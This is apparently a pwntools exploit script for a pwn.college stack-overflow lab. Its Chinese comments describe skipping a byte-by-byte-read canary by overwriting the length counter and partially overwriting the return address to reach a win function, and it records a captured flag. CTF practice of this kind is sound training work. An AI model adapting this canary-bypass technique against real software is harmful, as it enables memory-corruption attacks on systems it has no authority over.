# 这一题开了canary, 但是是一字节一字节读入
# 可以控制覆盖长度n的值, 然后通过input+n来跳过canary去覆盖ret
# 当然只能在一定范围内进行控制, 一字节
# 哦还有个循环检查, size小于长度才会继续 while n<size do
# 设置为0x97后会自动加一
# pwn_college{AIiC1QhlswbT9tqSNX5qMpwT8CE.dZTMywiMxkzW}


from pwn import *

pro_name = "./babymem_level9_teaching1"

win = 0x1e09    # 要爆破第一位, 直接跳到函数内, 绕过传参
payload = b'A'*124+b'\x97'+b'\x09\x7e'

while True:
    io = process(pro_name)
    io.recvuntil(b"size: ")
    io.sendline(b'154')
    io.sendline(payload)
    #a = io.recvall()
    io.interactive()
    print(io.poll())
    break
    if io.poll() ！= -11:
        print(a)
        break
